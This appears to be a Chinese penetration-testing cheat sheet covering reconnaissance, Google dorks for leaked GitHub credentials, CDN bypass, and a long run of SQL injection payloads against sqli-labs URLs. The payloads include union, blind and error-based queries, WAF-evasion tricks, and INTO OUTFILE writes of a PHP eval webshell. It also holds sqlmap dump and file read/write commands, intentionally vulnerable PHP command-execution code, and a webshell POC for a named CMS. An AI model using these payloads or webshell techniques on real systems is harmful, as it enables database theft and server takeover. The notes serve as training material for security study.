[TOC]

# 乌云漏洞库

http://www.anquan.us/
https://shuimugan.com

# 端口收集
端口号只有整数，范围是从0到65535（2^16-1）。
例如计算机中的80端口、21端口、23端口等。
在Windows命令行中使用`netstat -anbo`显示开放端口。

1、使用nmap探测。nmap-A-v-T4目标
2、使用masscan探测。
3、使用在线网站探测http:/tool.chinaz.com/port/。


端口    端口说明            攻击方法
22      SSH远程连接         爆破、SSH隧道及内网代理转发、文件传输
23      Telnet远程连接      爆破、嗅探、弱口令
3389    rdp远程桌面         Shift后门、爆破
5900    VNC远程连接         弱口令、RCE
5632    PcAnywhere远程连接  嗅探、代码执行

# 信息收集
## Google hacking
关键字    含义
site     指定搜索域名例如：site:baidu.com
inurl    指定URL中是否存在某些关键字例如：inurl:.php？id=
intext   指定网页中是否存在某些关键字例如：intext：网站管理
filetype 指定搜索文件类型例如：filetype:txt
intitle  指定网页标题是否存在某些关键字例如：intitle：后台管理
link     指定网页链接例如：link:baidu.com 指定与百度做了外链的站点
info     指定搜索网页信息info:baidu.com


Google hacking数据库：https://www.exploit-db.com/google-hacking-database/
例如：查询Access数据：filetype:mdb"standard jet"（password Iusername |user|pass）


# 指纹收集
编写Python脚本requests库参考链接：http://www.python-requests.org/en/master/
import requests
r=requests.get（'目标’）
print（r.headers）


# 信息泄露
Github之邮件配置信息泄露：
`site:Github.com smtp`
`site:Github.com smtp@qq.com`
Github之数据库信息泄露：
`site:Github.com sa password`
`site:Github.com root password`
`site:Github.com User ID='sa'；Password`
Github之svn信息泄露：
`site:Github.com svn`
`site:Github.com svn username`
Github之综合信息泄露：
`site:Github.com password`
`site:Github.com ftp ftppassword`
`site:Github.com 密码`
`site:Github.com 内部`


# 绕CDN获取真实ip
通过Ping判断是否存在CDN。
通过设置代理或者利用在线ping网站来使用不同地区的Ping服务器来测试目标。
http://ping.chinaz.com/


http://www.ip138.com


如果目标使用CDN，需要绕过CDN来获取真实IP地址。
1、内部邮箱源收集到内部邮箱服务器IP地址2、网站phpinfo文件phpinfo.php
3、分站IP地址，查询子域名CDN很贵，很有可能分站就不再使用CDN。
4、国外访问https://asm.ca.com/en/ping.php
5、查询域名解析记录 https://viewdns.info/


# Shodan搜索引擎
## Shodan搜索语法
webcam搜索摄像头
指定端口  port:22
指定城市  city:
查询主机信息    host:ip


# MYSQL



## Mysql5.0以上的版本默认配置
在Mysql5.0以上的版本中，为了方便管理，默认定义了`information_schema`数据库，用来存储数据库元信息。
其中具有表`schemata`（数据库名）、`tables`（表名）、`columns`（列名或字段名）。

在`schemata`表中，`schema_name`字段用来存储`数据库名`。
在`tables`表中，`table_schema`和`table_name`分别用来存储`数据库名`和`表名`。
在`columns`表中，`table_schema`（数据库名）、`table_name`（表名）、`column_name`（字段名）

可以利用Navicat for MySQL查看结构


## MYSQL语句
查
`SELECT 列名称 FROM 表名称 WHERE 字段1='条件1' AND 字段2='条件2'`
`select * from admin where id=1;`

列名称可以用*
where 筛选

增
`INSERT INTO table_name（字段名1，字段名2…）VALUES（值1，值2..…）`
`insert into admin(id,username,password) values(3,cx,cx);`

没有字段名就是在所有字段里加值

改
`UPDATE 表名称 SET 列名称=新值 WHERE 列名称=某值`
`update admin set password='cxcx' where username='cx';`

删
DELETE FROM 表名称 WHERE 列名称=值
`delete from admin where password='cxcx';`

``CREATE DATABASE `test` CHARACTER SET 'utf8' COLLATE 'utf8_bin';``

数据库名：test
字符集：UTF8
排序规则：utf8_bin


`show databases;`

切换数据库
`use test;`

`show tables;`

## MYSQL函数

### MYSQL常用聚合函数




`select user();`
查看当前登录用户名

`select database();`
查看当前使用的数据库名

`select version();`
查看版本

    count() 计数
    sum() 求和
    avg() 平均数
    max() 最大值
    min() 最小值


### CONCAT()函数
CONCAT()函数用于将多个字符串连接成一个字符串。

1、语法及使用特点：
CONCAT(str1,str2,…)                       
返回结果为连接参数产生的字符串。**如有任何一个参数为NULL ，则返回值为 NULL**。可以有一个或多个参数。

2、使用示例：
`SELECT CONCAT(id, ‘，’, name) AS con FROM info LIMIT 1;`返回结果为
```
+----------+
| con      |
+----------+
| 1,BioCyc |
+----------+
```

SELECT CONCAT(‘My’, NULL, ‘QL’);返回结果为
```
+--------------------------+
| CONCAT('My', NULL, 'QL') |
+--------------------------+
| NULL                     |
+--------------------------+
```

3、如何指定参数之间的分隔符
使用函数CONCAT_WS()。
使用语法为：CONCAT_WS(separator,str1,str2,…)

CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。**第一个参数是其它参数的分隔符**。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。**如果分隔符为 NULL，则结果为 NULL**。
该函数会**忽略任何分隔符参数后的 NULL 值**。但是CONCAT_WS()**不会忽略任何空字符串**。 
即空字符串会有分隔符，NULL不会有分隔符

如`SELECT CONCAT_WS('_',id,name) AS con_ws FROM info LIMIT 1;`返回结果为
```
+----------+
| con_ws   |
+----------+
| 1_BioCyc |
+----------+
```

`SELECT CONCAT_WS(',','First name',NULL,'Last Name');`返回结果为
```
+----------------------------------------------+
| CONCAT_WS(',','First name',NULL,'Last Name') |
+----------------------------------------------+
| First name,Last Name                         |
+----------------------------------------------+
```

### GROUP_CONCAT()函数
GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。

使用表info作为示例，其中语句`SELECT locus,id,journal FROM info WHERE locus IN('AB086827','AF040764');`的返回结果为
```
+----------+----+--------------------------+
| locus    | id | journal                  |
+----------+----+--------------------------+
| AB086827 |  1 | Unpublished              |
| AB086827 |  2 | Submitted (20-JUN-2002)  |
| AF040764 | 23 | Unpublished              |
| AF040764 | 24 | Submitted (31-DEC-1997)  |
+----------+----+--------------------------+
```

1、使用语法及特点：
`GROUP_CONCAT([DISTINCT] expr [,expr ...]
[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]] [SEPARATOR str_val])`

在 MySQL 中，你可以得到表达式结合体的连结值。通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。

SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (",")，可以通过指定 SEPARATOR "" 完全地移除这个分隔符。
可以通过变量 group_concat_max_len 设置一个最大的长度。在运行时执行的句法如下： SET [SESSION | GLOBAL] group_concat_max_len = unsigned_integer;
如果最大长度被设置，结果值被剪切到这个最大长度。如果分组的字符过长，可以对系统参数进行设置：SET @@global.group_concat_max_len=40000;

2、使用示例：
语句 `SELECT locus,GROUP_CONCAT(id) FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;` 的返回结果为
```
+----------+------------------+
| locus    | GROUP_CONCAT(id) |
+----------+------------------+
| AB086827 | 1,2              |
| AF040764 | 23,24            |
+----------+------------------+
```

语句 `SELECT locus,GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;`的返回结果为
```
+----------+----------------------------------------------------------+
| locus    | GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR '_') |
+----------+----------------------------------------------------------+
| AB086827 | 2_1                                                      |
| AF040764 | 24_23                                                    |
+----------+----------------------------------------------------------+
```
语句`SELECT locus,GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') FROM info WHERE locus IN('AB086827','AF040764') GROUP BY locus;`的返回结果为
```
+----------+--------------------------------------------------------------------------+
| locus    | GROUP_CONCAT(concat_ws(', ',id,journal) ORDER BY id DESC SEPARATOR '. ') |
+----------+--------------------------------------------------------------------------+
| AB086827 | 2, Submitted (20-JUN-2002). 1, Unpublished                               |
| AF040764 | 24, Submitted (31-DEC-1997) . 23, Unpublished                            | 
+----------+--------------------------------------------------------------------------+
```


## 关键字
### limit

**输出从m行到m+n行**
`limit m,n`

**行数从0开始**

`select * from admin limit 0,4;`


## 注释
#### 注释符

在Mysql中常见的注释符表达式：`#`或`--空格`或`/**/`

#### 内联注释(可以执行)

`/*! SQL语句*/`只有Mysql可以识别，常用来绕过WAF

例如：`select*from articles where id = id`
使用内联注释注入：`select*from articles where id=-1/*!union*//*!select*/1,2,3,4`





## MYSQL文件操作
mysql数据库在渗透过程中能够使用的功能还是比较多的，除了读取数据之外，还可以进行对文件进行读写（但前提是权限足够）。
### 文件读取
读取前提：
1、用户权限足够高，尽量具有root权限。
2、secure_file_priv不为NULL。（默认为NULL）
mysql> `show global variables like "secure_file_priv";`

`select @@secure_file_priv`
没有配置就读文件会返回NULL,NULL是无法读取和写入文件的，要设置为空才行。

必须有权限读取并且文件必须完全可读。

   `and (select count(*) from mysql.user)>0 `/*如果结果返回正常，说明具有读写权限.*/

   `and (select count(*) from mysql.user)>0 `/* 返回错误，应该是管理员给数据库账户降权了*/

`mysql-ini文件`

>[mysqld]
port=3306
basedir="D:/phpStudy/MySQL/"
datadir="D:/phpStudy/MySQL/data/"
character-set-server=utf8
default-storage-engine=MyISAM
\#支持 INNODB 引擎模式。修改为　default-storage-engine=INNODB　即可。
\#如果 INNODB 模式如果不能启动，删除data目录下ib开头的日志文件重新启动。

这段代码后加入配置`secure_file_priv=`



坑点：修改配置文件后需要重启服务

### 读取文件函数
`load_file('路径')`


windows下MYSQL相对路径的起始为`D:\phpStudy\MySQL\data\mysql`

windows下根目录为当前盘

坑点：路径的反斜杠要两个，反斜杠转义反斜杠，斜杠用一个就行

mysql> `select load_file('\\flag.txt');`
mysql> `select load_file('/flag.txt');`

mysql> `select load_file('D:/flag.txt');`

### 写入文件

#### 方法一

`http://localhost/sqli-labs-master/Less-7/?id=0')) union select 1,'<?php phpinfo();?>',3 into outfile 'D:\\phpStudy\\WWW\\test.php'--+`



`select *** into outfile '路径+文件名'`
会把前面select的所有***内容输出到指定路径的文件中

不能覆盖或者追加到已经存在的文件，只能写入到新文件


输出字符串需要用引号包裹

`http://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,“<?php @eval($_POST['do']);?>”,3 into outfile 'D:\\phpStudy\\WWW\\error.php'--+`

@ 不报错

字符串内有单引号，用双引号包裹或者用反斜杠转义



坑点 

union select前面有select 不用and拼接



#### 方法二
查询都自动写入文件：
mysql> pager cat > /tmp/test.txt ;
PAGER set to 'cat > /tmp/test.txt'
之后的所有查询结果都自动写入/tmp/test.txt'，并前后覆盖
mysql> select * from table ;
30 rows in set (0.59 sec)
在框口不再显示查询结果

前两种方式,导出的文件都在数据库所在服务器上


#### 方法三
跳出mysql命令行  这种方式可以将结果导出到本地文件
[root@SHNHDX63-146 ~]# mysql -h 127.0.0.1 -u root -p XXXX -P 3306 -D database_name -e "select * from table"  > /tmp/test/txt


## SQL注入

### 原理
登录SQL语句：
`select*from admin where username='用户输入的用户名'and password='用户输入的密码'`
用户输入的内容可由用户自行控制，例如可以输入`' or 1=1 --空格`
SQL语句：`select*from admin where username='' or 1=1 -- 'and password='`
用户输入的密码其中or1=1永远为真，--注释后边内容不再执行，因此SQL语句执行会返回admin表中的所有内容。


根据注入位置数据类型可将SQL注入分为两类：数字型和字符型。

例如：
数字型：`select*from table where id=用户输入id`

字符型：`select*from table where id='用户输入id'`

判断是否存在注入点
通过在URL中修改对应的ID值，为正常数字、大数字、字符（单引号、双引号、双单引号、括号）、反斜杠\来探测URL中是否存在注入点。

' %27
" %22
回车 %0a
空格 %20或者+
% %25
? %3f
; %3b


### 报错注入

order by i

对select的内容进行排序，默认升序，可以加关键字

i为字段数（第几列）
按照第i个字段对数据进行行排序

1、利用order by判断字段数。

http://localhost/0/sqli-labs-master/Less-1/?id=1%27%20order%20by%204--+



2、利用union select联合查询，获取表名。
0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+


3、利用union select 联合查询，获取字段名。
0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+


4、利用union select联合查询，获取字段值。
0' union select 1,group_concat(username,0x3a,password),3 from users--+


0x3a:冒号的16进制，用于分割,显示清楚
可以换成数字，字符的十六进制

利用union select和聚合函数查询当前用户，当前数据库名和数据库版本
http://localhost/0/sqli-labs-master/Less-1/?id=0' UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3--+

http://localhost/0/sqli-labs-master/Less-2/?id='0' UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3--+

联合查询前面的语句不能输出正确结果（可以报错），不然联合查询结果无法显示



UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。

union select 的字段数要对且用逗号隔开
order by 前面不能报错


### 盲注
#### 基于时间的盲注

select if(判断语句,判断为true执行的语句,判断为false执行语句)


if(expr1,expr2,expr3)

如果 expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。

substr(str,a,b)
取str的第a个到第b个字符


当数据库名第一个字母的asci码等于115时，执行一次sleep（3）函数等待3秒。

http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+

**需要用and拼接语句**



#### 基于布尔型的盲注

我们通常采用下面的办法猜解字符串.
select length(databse()));
select substr(databse(),1,1);
select ascii(substr(database(),1,1));
select ascii(substr(database(),1,1))>N;
select ascii(substr(database(),1,1))=N;
select ascii(substr(database(),1,1))<N;


`http://localhost/sqli-labs-master/Less-8/?id=1' and length(database())=8--+`




### 报错双查询注入

`select count(*),concat_ws(':',([子查询],floor(rand()*2))) as a from [table_name] group by a;`

MYSQL语句中，参数为某函数计算的结果时，用括号包裹参数
括号包裹的内容会先进行计算

报错注入形式上是两个嵌套的查询，即select.…（select..…），里面的那个select被称为子查询，他的执行顺序也提先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sql函数：

- rand()随机函数，返回0~1之间的某个值
- floor(a)取整函数，返回小于等于a，且值最接近a的一个整数
- count()聚合函数也称作计数函数，返回查询对象的总数
- group by clause分组语句，按照查询结果分组

**查询的时候如果使用rand()的话，该值会被计算多次。**
在使用group by的时候，floor（rand（0）*2）会被执行一次，
如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中floor（rand（0）*2）的值是定性的，为011011

`select count(*) from table group by floor(rand(0)*2);`

`select concat_ws(':',(select database()),floor(rand()*2)) as b from information_schema.tables;`

会执行n次concat_ws(':',(select database()),floor(rand()*2)) as b，
n为information_schema.tables表的字段数

#### GROUP BY
我们可以先从字面上来理解，GROUP表示分组，BY后面写字段名，就表示根据哪个字段进行分组。
GROUP BY必**须得配合聚合函数来用**，分组之后你可以计数（COUNT），求和（SUM），求平均数（AVG）等。




深层次的原因：
通过floor报错的方法来爆数据的本质是group by语句的报错。
group by语句报错的原因是`floor(random(0)*2)`的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。`group by floor(random(0)*2)`出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下`floor(random(0)*2)`可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。




Payload:


查库名
`http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(':',(select database()),floor(rand()*2)) as a from information_schema.tables group by a--+`


查表名
`http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(':',(select table_name from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a--+`

报错
> Subquery returns more than 1 row


加limit
`http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(':',(select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+`



查字段


表名为emails
`http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(':',(select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+`


查值
字段名为id和email_id
`http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(':',(select email_id from emails where id='1' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+`

### ExtractValue和UpdateXml函数报错注入
`union select extractvalue(1,concat(0x7e,(select user())))`

`union select updatexml(1,concat(0x3a,(select user())),1)`

### SQL注入绕过技巧
#### 1.绕过空格（注释符/* */，%a0）：
　　两个空格代替一个空格，用Tab代替空格，%a0=空格：
`%20` `%09` `%0a` `%0b` `%0c` `%0d` `%a0` `%00` `/**/`  `/*! */`
最基本的绕过方法，用注释替换空格：
/*  注释 */

使用浮点数：
`select * from users where id=8E0union select 1,2,3`
`select * from users where id=8.0 select 1,2,3`

#### 2.括号绕过空格：
　　如果空格被过滤，括号没有被过滤，可以用括号绕过。
　　**在MySQL中，括号是用来包围子查询的**。因此，**任何可以计算出结果的语句，都可以用括号包围起来**。**而括号的两端，可以没有多余的空格**。
例如：
`select(user())from dual where(1=1)and(2=2)`
　　这种过滤方法常常用于time based盲注,例如：
`?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23`
（from for属于逗号绕过下面会有）
　　上面的方法既没有逗号也没有空格。猜解database()第一个字符ascii码是否为109，若是则加载延时。

#### 3.引号绕过（使用十六进制）：
　　会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：
`select column_name  from information_schema.tables where table_name="users"`
　　这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
　　users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
`select column_name  from information_schema.tables where table_name=0x7573657273`

#### 4.逗号绕过（使用from或者offset）：
　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：
`select substr(database() from 1 for 1);`
`select mid(database() from 1 for 1);`

- 使用join：
`union select 1,2`    #等价于
`union select * from (select 1)a join (select 2)b`

- 使用like：
`select ascii(mid(user(),1,1))=80`  #等价于
`select user() like 'r%'`

- 对于limit可以使用offset来绕过：
`select * from news limit 0,1`  # 等价于下面这条SQL语句
`select * from news limit 1 offset 0`

#### 5.比较符号（<>）绕过（过滤了<>：sqlmap盲注经常使用<>，使用between的脚本）：

使用greatest()、least()：（前者返回最大值，后者返回最小值）

　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。

　　最常见的一个盲注的sql语句：
`select * from users where id=1 and ascii(substr(database(),0,1))>64`
　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
　　那么上面的这条sql语句可以使用greatest变为如下的子句:
`select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64`

使用between and：
`between a and b`：返回a，b之间的数据，不包含b。

#### 6.or and xor not绕过：
and=&&  or=||   xor=|   not=!
#### 7.绕过注释符号（#，--(后面跟一个空格））过滤：
id=1' union select 1,2,3||'1
　　最后的or '1闭合查询语句的最后的单引号，或者：
id=1' union select 1,2,'3
#### 8.=绕过：
　　使用like 、rlike 、regexp 或者 使用< 或者 >
#### 9.绕过union，select，where等：
（1）使用注释符绕过：
　　常用注释符：
`//`，`--` , `/**/`, `#`, `--+`, `-- -`,` ;`,`%00`,`--a`
　　用法：
`U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user`
（2）使用大小写绕过：
`id=-1'UnIoN/**/SeLeCT`
（3）内联注释绕过：
`id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#`
（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：
`id=-1'UNIunionONSeLselectECT1,2,3–-`
#### 10.通用绕过（编码）：
　　如URLEncode编码，ASCII,HEX,unicode编码绕过：
`or 1=1`即`%6f%72%20%31%3d%31`，而`Test`也可以为`CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)`。
#### 11.等价函数绕过：

hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　

或者：
`substr((select 'password'),1,1) = 0x70`
`strcmp(left('password',1), 0x69) = 1`
`strcmp(left('password',1), 0x70) = 0`
`strcmp(left('password',1), 0x71) = -1`

#### 12.宽字节注入：
　　过滤 `'` 的时候往往利用的思路是将 `'` 转换为 `\'` 。

　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：
- （1）`%df` 吃掉 `\` 具体的方法是 `urlencode('\) = %5c%27`，我们在 `%5c%27` 前面添加 `%df` ，形成 `%df%5c%27` ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，`%df%5c` 就是一个汉字，`%27` 作为一个单独的（'）符号在外面：
`id=-1%df%27union select 1,user(),3--+`
- （2）将 `\'` 中的 `\` 过滤掉，例如可以构造 `%**%5c%5c%27` ，后面的 `%5c` 会被前面的 `%5c` 注释掉。

一般产生宽字节注入的PHP函数：
- 1.replace()：过滤 `'` `\` ，将 `'` 转化为 `\'` ，将 `\`  转为 `\\`，将 " 转为 `\"` 。用思路一。

- 2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：`'` , `"` , `\` 。用思路一
（防御此漏洞，要将 mysql_query 设置为 binary 的方式）

- 3.mysql_real_escape_string()：转义下列字符：
`\x00`     `\n`     `\r`     `\`     `'`     `"`     `\x1a`
（防御，将mysql设置为gbk即可）



## SQLMAP
gedit linux图形化文本编辑器


`sqlmap -r target.txt -p username --dbs`
- -p指定参数

数据库查询
`sqlmap-u"192.168.1.104:8081/cms/articles.php?id=1"--dbs`

表查询
`sqlmap-u"192.168.1.104:8081/cms/articles.php?id=1"-D cms--tables`

字段查询
`sqlmap-u"192.168.1.104:8081/cms/articles.php?id=1"-D cms -T articles--columns`

值查询
`sqlmap-u"192.168.1.104:8081/cms/articles. php? id=1"-D cms -T articles -C id, title, content--dump`

读取文件
`sqlmap -u "http://192.168.1.101/sqli/Less-7/?id=1" --file-read "F:\\flag.txt"`

写入文件
`sqlmap -u "http://192.168.1.101/sqli/Less-7/?id=1" --file-write "/root/Desktop/target.txt" --file-dest "F:\\targe t.txt"`



# PHP命令执行漏洞

##漏洞函数
在PHP中具有执行系统命令功能的函数如下：
1、system
2、exec
3、shell_exec
4、passthru
5、popen
6、proc_popen

```
<?php
  echo "<pre>";
  if(isset($_GET["cmd"])){
      system($_GET["cmd"]);
  }
  echo"</pre>";
?>
```


### Windows绕过
```
<?php
  echo "<pre>";
  $arg=$_GET['cmd'];
  if($arg){
     system("ping $arg");
     echo"</pre>";
?>
```
命令执行漏洞拼接符介绍
在Windows系统下的cmd命令中，有以下一些截断拼接符。


`&`前面的语句为假则直接执行后面的，为真则按顺序执行
`&&`前面的语句为假则直接出错，后面的也不执行，为真则按顺序执行
`|`直接执行后面的语句，前面不执行
`||`前面出错执行后面的，不出错不执行后面

### Linux绕过
```
<?php
  echo"<pre>";
  $arg =$_GET['cmd'];
  if($arg){
     system("ping -c 4 $arg"); 
  echo "</pre>";
?>
```

linux下的ping命令默认不停
-c 参数限制ping的次数


启动apache服务：service apache2 start
查看apache状态：service apache2status


站点根目录
/var/www/html/


在Linux系统下的shell命令中，有以下一些截断拼接符。



`;`前面的执行完执行后面的
`|`是管道符，显示后面的执行结果
`||`当前面的执行出错时执行后面的，不出错不执行后面

其中&无论前边语句真假都会执行
&&只有前边语句为真，才会执行后边语句。


PHP下命令执行补充
在PHP中，除了函数可以执行系统命令。反引号也可以作为系统命令执行来使用。
```
<?php echo"<pre>"; if(isset($_GET["cmd"])){
$cmd=$_GET["cmd"]; echo$cmd'; echo "</pre>";
?>
```

### 代码执行漏洞
#### eval()
PHP eval函数介绍
eval()函数把**字符串**按照PHP代码来计算。
该字符串必须是**合法的PHP代码**，且**必须以分号结尾**。
如果没有在代码字符串中调用return 语句，则返回NULL。如果代码中存在解析错误，则eval（）函数返回false。

示例代码
```
<?php
echo eval($_GET['do'].";");
?>
```
菜刀连接：`http://localhost/sec/test/test.php?do=eval($_POST[cmd])`

命令执行漏洞案例演示
海洋cms6.28
利用菜刀连接命令执行的位置。（也被称为代码执行）
POC:`/search.php?searchtype=5&tid=&area=eval($_POST[cmd])`



### commix工具

commix工具介绍
Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。

项目地址：https://github.com/stasinopoulos/commix


